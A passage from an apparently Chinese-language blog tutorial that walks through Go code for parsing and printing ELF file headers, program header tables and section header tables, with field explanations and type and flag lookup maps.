class="keyword">int64</span>(Ehdr.e_ehsize),<span class="string">"(bytes)"</span>)</span><br><span class="line">	<span class="comment">//Size of program headers</span></span><br><span class="line">	fmt.Printf(<span class="string">"%-35s"</span>,<span class="string">"Size of program headers:"</span>)</span><br><span class="line">	fmt.Println(<span class="keyword">int64</span>(Ehdr.e_phentsize),<span class="string">"(bytes)"</span>)</span><br><span class="line">	<span class="comment">//Number of program headers</span></span><br><span class="line">	fmt.Printf(<span class="string">"%-35s"</span>,<span class="string">"Number of program headers:"</span>)</span><br><span class="line">	fmt.Println(<span class="keyword">int64</span>(Ehdr.e_phnum))</span><br><span class="line">	<span class="comment">//Size of section headers</span></span><br><span class="line">	fmt.Printf(<span class="string">"%-35s"</span>,<span class="string">"Size of section headers:"</span>)</span><br><span class="line">	fmt.Println(<span class="keyword">int64</span>(Ehdr.e_shentsize),<span class="string">"(bytes)"</span>)</span><br><span class="line">	<span class="comment">//Number of section headers</span></span><br><span class="line">	fmt.Printf(<span class="string">"%-35s"</span>,<span class="string">"Number of section headers:"</span>)</span><br><span class="line">	fmt.Println(<span class="keyword">int64</span>(Ehdr.e_shnum))</span><br><span class="line">	<span class="comment">//Section header string table index</span></span><br><span class="line">	fmt.Printf(<span class="string">"%-35s"</span>,<span class="string">"Section header string table index:"</span>)</span><br><span class="line">	fmt.Println(<span class="keyword">int64</span>(Ehdr.e_shstrndx))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Program-Header-Table"><a href="#Program-Header-Table" class="headerlink" title="Program Header Table"></a>Program Header Table</h2><h3 id="概述-2"><a href="#概述-2" class="headerlink" title="概述"></a>概述</h3><p>首先我们得先熟悉并且理解Program Header Table的结构体定义开始：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Elf32_phdr <span class="keyword">struct</span> &#123;</span><br><span class="line">	p_type Elf32_Word</span><br><span class="line">	<span class="comment">//此数组元素描述的段的类型，或者如何解释此数组元素的信息</span></span><br><span class="line">	p_offset Elf32_Off</span><br><span class="line">	<span class="comment">//此成员给出从文件头到该段第一个字节的偏移</span></span><br><span class="line">	p_vaddr Elf32_Addr</span><br><span class="line">	<span class="comment">//此成员给出段的第一个字节将被放到内存中的虚拟地址</span></span><br><span class="line">	p_paddr Elf32_Addr</span><br><span class="line">	<span class="comment">//此成员仅用于与物理地址相关的系统中。System V忽略所有应用程序的物理地址信息</span></span><br><span class="line">	p_filesz Elf32_Word</span><br><span class="line">	<span class="comment">//此成员给出段在文件映像中所占的字节数。可以为0</span></span><br><span class="line">	p_memsz Elf32_Word</span><br><span class="line">	<span class="comment">//此成员给出段在内存映像中占用的字节数。可以为0</span></span><br><span class="line">	p_flage Elf32_Word</span><br><span class="line">	<span class="comment">//此成员给出与段相关的标志(read、write、exec)</span></span><br><span class="line">	p_align Elf32_Word</span><br><span class="line">	<span class="comment">//此成员给出段在文件中和内存中如何对齐</span></span><br><span class="line">	<span class="comment">//字节对其,p_vaddr 和 p_offset 对 p_align 取模后应该等于0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面开始逐步解释各个字段</p>
<h4 id="p-type"><a href="#p-type" class="headerlink" title="p_type"></a>p_type</h4><p>声明此段的作用类型</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">PType := <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">string</span>&#123;</span><br><span class="line">		<span class="number">0x0</span>:<span class="string">"NULL"</span>,</span><br><span class="line">		<span class="number">0x1</span>:<span class="string">"LOAD"</span>,</span><br><span class="line">		<span class="number">0x2</span>:<span class="string">"DYNAMIC"</span>,</span><br><span class="line">		<span class="number">0x3</span>:<span class="string">"INERP"</span>,</span><br><span class="line">		<span class="number">0x4</span>:<span class="string">"NOTE"</span>,</span><br><span class="line">		<span class="number">0x5</span>:<span class="string">"SHLIB"</span>,</span><br><span class="line">		<span class="number">0x6</span>:<span class="string">"PHDR"</span>,</span><br><span class="line">		<span class="number">0x7</span>:<span class="string">"TLS"</span>,</span><br><span class="line">		<span class="number">0x8</span>:<span class="string">"NUM"</span>,</span><br><span class="line">		<span class="number">0x60000000</span>:<span class="string">"LOOS"</span>,</span><br><span class="line">		<span class="number">0x6474e550</span>:<span class="string">"GNU_EH_FRAME"</span>,</span><br><span class="line">		<span class="number">0x6474e551</span>:<span class="string">"GNU_STACK"</span>,</span><br><span class="line">		<span class="number">0x6474e552</span>:<span class="string">"GNU_RELRO"</span>,</span><br><span class="line">		<span class="number">0x6ffffffa</span>:<span class="string">"LOSUNW"</span>,</span><br><span class="line">		<span class="number">0x6ffffffc</span>:<span class="string">"SUNWBSS"</span>,</span><br><span class="line">		<span class="number">0x6ffffffb</span>:<span class="string">"SUNWSTACK"</span>,</span><br><span class="line">		<span class="number">0x6fffffff</span>:<span class="string">"HISUNW "</span>,</span><br><span class="line">		<span class="number">0x6ffffffe</span>:<span class="string">"HIOS"</span>,</span><br><span class="line">		<span class="number">0x70000000</span>:<span class="string">"LOPROC"</span>,</span><br><span class="line">		<span class="number">0x7fffffff</span>:<span class="string">"HIPROC"</span>,</span><br><span class="line">		<span class="comment">// ARM Sections</span></span><br><span class="line">		<span class="number">0x70000001</span>:<span class="string">"ARM_EXIDX"</span>,</span><br><span class="line">		<span class="number">0x70000002</span>:<span class="string">"ARM_PREEMPTMAP"</span>,</span><br><span class="line">		<span class="number">0x70000003</span>:<span class="string">"ARM_ATTRIBUTES"</span>,</span><br><span class="line">		<span class="number">0x70000004</span>:<span class="string">"ARM_DEBUGOVERLAY"</span>,</span><br><span class="line">		<span class="number">0x70000005</span>:<span class="string">"ARM_OVERLAYSECTION"</span>,</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h4 id="p-offset"><a href="#p-offset" class="headerlink" title="p_offset"></a>p_offset</h4><p>段相对于文件的索引地址</p>
<h4 id="p-vaddr"><a href="#p-vaddr" class="headerlink" title="p_vaddr"></a>p_vaddr</h4><p>段在内存中的虚拟地址</p>
<h4 id="p-paddr"><a href="#p-paddr" class="headerlink" title="p_paddr"></a>p_paddr</h4><p>段的物理地址</p>
<h4 id="p-filesz"><a href="#p-filesz" class="headerlink" title="p_filesz"></a>p_filesz</h4><p>段在文件中所占的长度</p>
<h4 id="p-memsz"><a href="#p-memsz" class="headerlink" title="p_memsz"></a>p_memsz</h4><p>段在内存中所占的长度</p>
<h4 id="p-flage"><a href="#p-flage" class="headerlink" title="p_flage"></a>p_flage</h4><p>段相关标志(read、write、exec)</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PFlag := <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">string</span>&#123;</span><br><span class="line">		<span class="number">0</span>:<span class="string">"N"</span>,</span><br><span class="line">		<span class="number">1</span>:<span class="string">"__E"</span>,</span><br><span class="line">		<span class="number">2</span>:<span class="string">"_W_"</span>,</span><br><span class="line">		<span class="number">3</span>:<span class="string">"_WE"</span>,</span><br><span class="line">		<span class="number">4</span>:<span class="string">"R__"</span>,</span><br><span class="line">		<span class="number">5</span>:<span class="string">"R_E"</span>,</span><br><span class="line">		<span class="number">6</span>:<span class="string">"RW_"</span>,</span><br><span class="line">		<span class="number">7</span>:<span class="string">"RWE"</span>,</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h4 id="p-align"><a href="#p-align" class="headerlink" title="p_align"></a>p_align</h4><p>给出段在文件中和内存中如何对齐</p>
<h3 id="读取Program-Header-Table"><a href="#读取Program-Header-Table" class="headerlink" title="读取Program Header Table"></a>读取Program Header Table</h3><p>这里的一个关键是如果从文件中读取出Program Header Table的数据，在ELF_Header中,我们可以得到Program Header的<strong>索引地址(e_phoff)</strong>、<strong>段数量(e_phnum)</strong>、<strong>表项大小(e_phentsize)</strong></p>
<p>那我们可以知道Program Header Table的数据起始地址Star_Addr，结束地址End_Addr：</p>
<ul>
<li>Star_Addr = e_phoff</li>
<li>End_Addr = e_phoff + e_phnum*e_phentsize</li>
</ul>
<p>获取到数据后，就需要一个个去读取每一个Program Header</p>
<p>转变为代码即为：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(phdr Elf32_phdr)</span> <span class="title">MainRead</span><span class="params">(Ehdr Elf32_Ehdr,data []<span class="keyword">byte</span>)</span></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> Phnum <span class="keyword">int64</span> = <span class="keyword">int64</span>(Ehdr.e_phnum) <span class="comment">//获取Program Header数量</span></span><br><span class="line">	<span class="keyword">var</span> StartIndex <span class="keyword">int64</span>= <span class="keyword">int64</span>(Ehdr.e_phoff)</span><br><span class="line">	<span class="keyword">for</span> i:=<span class="number">0</span>;i&lt;<span class="keyword">int</span>(Phnum);i++ &#123;</span><br><span class="line">		phdr.SonRead(StartIndex,data,<span class="keyword">int64</span>(Ehdr.e_phentsize))</span><br><span class="line">		StartIndex = StartIndex + <span class="keyword">int64</span>(Ehdr.e_phentsize)</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">""</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(phdr Elf32_phdr)</span> <span class="title">SonRead</span><span class="params">(StartIndex <span class="keyword">int64</span>,data []<span class="keyword">byte</span>,size <span class="keyword">int64</span>)</span></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> t_phdr Elf32_phdr</span><br><span class="line">	<span class="keyword">var</span> t_data []<span class="keyword">byte</span> = data[StartIndex:StartIndex+size]</span><br><span class="line">	<span class="comment">//p_type Elf32_Word</span></span><br><span class="line">	tmp := t_data[:<span class="number">4</span>]</span><br><span class="line">	tmp = Change.LSBtoMSB(tmp)</span><br><span class="line">	t_phdr.p_type = Elf32_Word(Change.BytesToInt32(tmp))</span><br><span class="line">	<span class="comment">//p_offset Elf32_Off</span></span><br><span class="line">	tmp = t_data[<span class="number">4</span>:<span class="number">8</span>]</span><br><span class="line">	tmp = Change.LSBtoMSB(tmp)</span><br><span class="line">	t_phdr.p_offset = Elf32_Off(Change.BytesToInt32(tmp))</span><br><span class="line">	<span class="comment">//p_vaddr Elf32_Addr</span></span><br><span class="line">	tmp = t_data[<span class="number">8</span>:<span class="number">12</span>]</span><br><span class="line">	tmp = Change.LSBtoMSB(tmp)</span><br><span class="line">	t_phdr.p_vaddr = Elf32_Addr(Change.BytesToInt32(tmp))</span><br><span class="line">	<span class="comment">//p_paddr Elf32_Addr</span></span><br><span class="line">	tmp = t_data[<span class="number">12</span>:<span class="number">16</span>]</span><br><span class="line">	tmp = Change.LSBtoMSB(tmp)</span><br><span class="line">	t_phdr.p_paddr = Elf32_Addr(Change.BytesToInt32(tmp))</span><br><span class="line">	<span class="comment">//p_filesz Elf32_Word</span></span><br><span class="line">	tmp = t_data[<span class="number">16</span>:<span class="number">20</span>]</span><br><span class="line">	tmp = Change.LSBtoMSB(tmp)</span><br><span class="line">	t_phdr.p_filesz = Elf32_Word(Change.BytesToInt32(tmp))</span><br><span class="line">	<span class="comment">//p_memsz Elf32_Word</span></span><br><span class="line">	tmp = t_data[<span class="number">20</span>:<span class="number">24</span>]</span><br><span class="line">	tmp = Change.LSBtoMSB(tmp)</span><br><span class="line">	t_phdr.p_memsz = Elf32_Word(Change.BytesToInt32(tmp))</span><br><span class="line">	<span class="comment">//p_flage Elf32_Word</span></span><br><span class="line">	tmp = t_data[<span class="number">24</span>:<span class="number">28</span>]</span><br><span class="line">	tmp = Change.LSBtoMSB(tmp)</span><br><span class="line">	t_phdr.p_flage = Elf32_Word(Change.BytesToInt32(tmp))</span><br><span class="line">	<span class="comment">//p_align Elf32_Word</span></span><br><span class="line">	tmp = t_data[<span class="number">28</span>:<span class="number">32</span>]</span><br><span class="line">	tmp = Change.LSBtoMSB(tmp)</span><br><span class="line">	t_phdr.p_align = Elf32_Word(Change.BytesToInt32(tmp))</span><br><span class="line">	<span class="comment">//p_type</span></span><br><span class="line">	tmpstr := PType[<span class="keyword">int</span>(<span class="keyword">int32</span>(t_phdr.p_type))]</span><br><span class="line">	<span class="keyword">if</span> tmpstr ==<span class="string">""</span>&#123;</span><br><span class="line">		fmt.Printf(<span class="string">"%-13s"</span>,<span class="string">"Unknown"</span>)</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		fmt.Printf(<span class="string">"%-13s"</span>,tmpstr)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//p_offset</span></span><br><span class="line">	fmt.Print(<span class="string">"  "</span>)</span><br><span class="line">	tstr := <span class="string">"0x"</span>+Change.DecHex(<span class="keyword">int64</span>(t_phdr.p_offset))</span><br><span class="line">	fmt.Printf(<span class="string">"%-9s"</span>,tstr)</span><br><span class="line">	<span class="comment">//p_vaddr</span></span><br><span class="line">	tstr = <span class="string">"0x"</span>+Change.DecHex(<span class="keyword">int64</span>(t_phdr.p_vaddr))</span><br><span class="line">	fmt.Printf(<span class="string">"%-11s"</span>,tstr)</span><br><span class="line">	<span class="comment">//p_paddr</span></span><br><span class="line">	tstr = <span class="string">"0x"</span>+Change.DecHex(<span class="keyword">int64</span>(t_phdr.p_paddr))</span><br><span class="line">	fmt.Printf(<span class="string">"%-11s"</span>,tstr)</span><br><span class="line">	<span class="comment">//p_filesz</span></span><br><span class="line">	tstr = <span class="string">"0x"</span>+Change.DecHex(<span class="keyword">int64</span>(t_phdr.p_filesz))</span><br><span class="line">	fmt.Printf(<span class="string">"%-8s"</span>,tstr)</span><br><span class="line">	<span class="comment">//p_memsz</span></span><br><span class="line">	tstr = <span class="string">"0x"</span>+Change.DecHex(<span class="keyword">int64</span>(t_phdr.p_memsz))</span><br><span class="line">	fmt.Printf(<span class="string">"%-8s"</span>,tstr)</span><br><span class="line">	<span class="comment">//p_flage</span></span><br><span class="line">	<span class="comment">//R:Read W:Write E:Exec N:None</span></span><br><span class="line">	tmpstr = PFlag[<span class="keyword">int</span>(<span class="keyword">int32</span>(t_phdr.p_flage))]</span><br><span class="line">	<span class="keyword">if</span> tmpstr ==<span class="string">""</span>&#123;</span><br><span class="line">		fmt.Printf(<span class="string">"%-13s"</span>,<span class="string">"Unknown"</span>)</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		fmt.Printf(<span class="string">"%-4s"</span>,tmpstr)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//p_align</span></span><br><span class="line">	tstr = <span class="string">"0x"</span>+Change.DecHex(<span class="keyword">int64</span>(t_phdr.p_align))</span><br><span class="line">	fmt.Printf(<span class="string">"%-8s\n"</span>,tstr)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>负责打印一开始的部分</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(phdr Elf32_phdr)</span> <span class="title">PHeader</span><span class="params">(Ehdr Elf32_Ehdr)</span></span>&#123;</span><br><span class="line">	EhdrType := <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">string</span>&#123;</span><br><span class="line">		<span class="number">0x0</span> : <span class="string">"NONE"</span>,<span class="comment">//No file type</span></span><br><span class="line">		<span class="number">0x1</span> : <span class="string">"REL"</span>,<span class="comment">//Relocatable</span></span><br><span class="line">		<span class="number">0x2</span> : <span class="string">"EXEC"</span>,<span class="comment">//Executable</span></span><br><span class="line">		<span class="number">0x3</span> : <span class="string">"DYN"</span>,<span class="comment">//Shared object</span></span><br><span class="line">		<span class="number">0x4</span> : <span class="string">"CORE"</span>,<span class="comment">//Core</span></span><br><span class="line">		<span class="number">0xfe00</span> : <span class="string">"LOOS"</span>,<span class="comment">//OS specific</span></span><br><span class="line">		<span class="number">0xfeff</span> : <span class="string">"HIOS"</span>,<span class="comment">//OS specific</span></span><br><span class="line">		<span class="number">0xff00</span> : <span class="string">"LOPROC"</span>,<span class="comment">//Processor specific</span></span><br><span class="line">		<span class="number">0xffff</span> : <span class="string">"HIPROC"</span>,<span class="comment">//Processor specific</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">var</span> T_type <span class="keyword">string</span></span><br><span class="line">	tmpstr := EhdrType[<span class="keyword">int</span>(<span class="keyword">int32</span>(Ehdr.e_type))]</span><br><span class="line">	<span class="keyword">if</span> tmpstr == <span class="string">""</span>&#123;</span><br><span class="line">		T_type = <span class="string">"Unknown"</span></span><br><span class="line">	&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">		T_type =tmpstr</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">"Elf file type is "</span>+T_type)</span><br><span class="line">	fmt.Println(<span class="string">"Entry point 0x"</span>+Change.DecHex(<span class="keyword">int64</span>(Ehdr.e_entry)))</span><br><span class="line">	fmt.Print(<span class="string">"There are "</span>,Ehdr.e_phnum,<span class="string">" program headers, "</span>)</span><br><span class="line">	fmt.Println(<span class="string">"starting at offset"</span>,Ehdr.e_phoff)</span><br><span class="line">	fmt.Println(<span class="string">"Program Headers:"</span>)</span><br><span class="line">	fmt.Println(<span class="string">"Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Section-Header-Table"><a href="#Section-Header-Table" class="headerlink" title="Section Header Table"></a>Section Header Table</h2><h3 id="概述-3"><a href="#概述-3" class="headerlink" title="概述"></a>概述</h3><p>首先我们得先熟悉并且理解Section Header Table的结构体定义开始：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Elf32_Shdr <span class="keyword">struct</span> &#123;</span><br><span class="line">	sh_name Elf32_Word</span><br><span class="line">	<span class="comment">//节区名称,此处是一个在名称节区的索引</span></span><br><span class="line">	sh_type Elf32_Word</span><br><span class="line">	<span class="comment">//节区类型</span></span><br><span class="line">	sh_flags Elf32_Word</span><br><span class="line">	<span class="comment">//同Program Header的p_flags</span></span><br><span class="line">	sh_addr Elf32_Addr</span><br><span class="line">	<span class="comment">//节区索引地址</span></span><br><span class="line">	sh_offset Elf32_Off</span><br><span class="line">	<span class="comment">//节区相对于文件的偏移地址</span></span><br><span class="line">	sh_size Elf32_Word</span><br><span class="line">	<span class="comment">//节区的大小</span></span><br><span class="line">	sh_link Elf32_Word</span><br><span class="line">	<span class="comment">//此成员给出节区头部表索引链接</span></span><br><span class="line">	sh_info Elf32_Word</span><br><span class="line">	<span class="comment">//此成员给出附加信息</span></span><br><span class="line">	sh_addralign Elf32_Word</span><br><span class="line">	<span class="comment">//某些节区带有地址对齐约束</span></span><br><span class="line">	sh_entsize Elf32_Word</span><br><span class="line">	<span class="comment">//某些节区中包含固定大小的项目,如符号表</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面开始逐步解释各个字段</p>
<h4 id="sh-name"><a href="#sh-name" class="headerlink" title="sh_name"></a>sh_name</h4><p>节区名称,此处是一个在名称节区的索引</p>
<h4 id="sh-type"><a href="#sh-type" class="headerlink" title="sh_type"></a>sh_type</h4><p>节区类型</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">ShType := <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">string</span>&#123;</span><br><span class="line">		<span class="number">0x0</span>:<span class="string">"NULL"</span>,<span class="comment">/* Inactive section header */</span></span><br><span class="line">		<span class="number">0x1</span>:<span class="string">"PROGBITS"</span>,<span class="comment">/* Information defined by the program */</span></span><br><span class="line">		<span class="number">0x2</span>:<span class="string">"SYMTAB"</span>,<span class="comment">/* Symbol table - not DLL */</span></span><br><span class="line">		<span class="number">0x3</span>:<span class="string">"STRTAB"</span>,<span class="comment">/* String table */</span></span><br><span class="line">		<span class="number">0x4</span>:<span class="string">"RELA"</span>,<span class="comment">/* Explicit addend relocations, Elf64_Rela */</span></span><br><span class="line">		<span class="number">0x5</span>:<span class="string">"HASH"</span>,<span class="comment">/* Symbol hash table */</span></span><br><span class="line">		<span class="number">0x6</span>:<span class="string">"DYNAMIC"</span>,<span class="comment">/* Information for dynamic linking */</span></span><br><span class="line">		<span class="number">0x7</span>:<span class="string">"NOTE"</span>,<span class="comment">/* A Note section */</span></span><br><span class="line">		<span class="number">0x8</span>:<span class="string">"NOBITS"</span>,<span class="comment">/* Like SHT_PROGBITS with no data */</span></span><br><span class="line">		<span class="number">0x9</span>:<span class="string">"REL"</span>,<span class="comment">/* Implicit addend relocations, Elf64_Rel */</span></span><br><span class="line">		<span class="number">0xA</span>:<span class="string">"SHLIB"</span>,<span class="comment">/* Currently unspecified semantics */</span></span><br><span class="line">		<span class="number">0xD</span>:<span class="string">"DYNSYM"</span>,<span class="comment">/* Symbol table for a DLL */</span></span><br><span class="line">		<span class="number">0xE</span>:<span class="string">"INIT_ARRAY"</span>,<span class="comment">/* Array of constructors */</span></span><br><span class="line">		<span class="number">0xF</span>:<span class="string">"FINI_ARRAY"</span>,<span class="comment">/* Array of deconstructors */</span></span><br><span class="line">		<span class="number">0x10</span>:<span class="string">"PREINIT_ARRAY"</span>,<span class="comment">/* Array of pre-constructors */</span></span><br><span class="line">		<span class="number">0x11</span>:<span class="string">"GROUP"</span>,<span class="comment">/* Section group */</span></span><br><span class="line">		<span class="number">0x12</span>:<span class="string">"SYMTAB_SHNDX"</span>,<span class="comment">/* Extended section indeces */</span></span><br><span class="line">		<span class="number">0x13</span>:<span class="string">"NUM"</span>,<span class="comment">/* Number of defined types */</span></span><br><span class="line">		<span class="number">0x60000000</span>:<span class="string">"LOOS"</span>,<span class="comment">/* Lowest OS-specific section type */</span></span><br><span class="line">		<span class="number">0x6ffffff5</span>:<span class="string">"GNU_ATTRIBUTES"</span>,<span class="comment">/* Object attribuytes */</span></span><br><span class="line">		<span class="number">0x6ffffff6</span>:<span class="string">"GNU_HASH"</span>,<span class="comment">/* GNU-style hash table */</span></span><br><span class="line">		<span class="number">0x6ffffff7</span>:<span class="string">"GNU_LIBLIST"</span>,<span class="comment">/* Prelink library list */</span></span><br><span class="line">		<span class="number">0x6ffffff8</span>:<span class="string">"CHECKSUM"</span>,<span class="comment">/* Checksum for DSO content */</span></span><br><span class="line">		<span class="number">0x6ffffffa</span>:<span class="string">"LOSUNW"</span>,<span class="comment">/* Sun-specific low bound */</span></span><br><span class="line">		<span class="number">0x6ffffffb</span>:<span class="string">"SUNW_COMDAT"</span>,</span><br><span class="line">		<span class="number">0x6ffffffc</span>:<span class="string">"SUNW_syminfo"</span>,</span><br><span class="line">		<span class="number">0x6ffffffd</span>:<span class="string">"GNU_verdef"</span>,<span class="comment">/* Version definition section */</span></span><br><span class="line">		<span class="number">0x6ffffffe</span>:<span class="string">"GNU_verdneed"</span>,<span class="comment">/* Version needs section */</span></span><br><span class="line">		<span class="number">0x6fffffff</span>:<span class="string">"GNY_versym"</span>,<span class="comment">/* Version symbol table */</span></span><br><span class="line">		<span class="number">0x70000000</span>:<span class="string">"LOPROC"</span>,<span class="comment">/* Start of processor-specific section type */</span></span><br><span class="line">		<span class="number">0x7fffffff</span>:<span class="string">"HIPROC"</span>,<span class="comment">/* End of processor-specific section type */</span></span><br><span class="line">		<span class="number">0x80000000</span>:<span class="string">"LOUSER"</span>,<span class="comment">/* Start of application-specific */</span></span><br><span class="line">		<span class="number">0x8fffffff</span>:<span class="string">"HIUSER"</span>,<span class="comment">/* Ennd of application-specific */</span></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h4 id="sh-flags"><a href="#sh-flags" class="headerlink" title="sh_flags"></a>sh_flags</h4><p>同Program Header的p_flags</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ShFlag := <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">string</span>&#123;</span><br><span class="line">		<span class="number">0x0</span>:<span class="string">""</span>,</span><br><span class="line">		<span class="number">0x1</span>:<span class="string">"W"</span>,</span><br><span class="line">		<span class="number">0x2</span>:<span class="string">"A"</span>,</span><br><span class="line">		<span class="number">0x3</span>:<span class="string">"WA"</span>,</span><br><span class="line">		<span class="number">0x4</span>:<span class="string">""</span>,</span><br><span class="line">		<span class="number">0x5</span>:<span class="string">""</span>,</span><br><span class="line">		<span class="number">0x6</span>:<span class="string">"AX"</span>,</span><br><span class="line">		<span class="number">0x30</span>:<span class="string">"MS"</span>,</span><br><span class="line">		<span 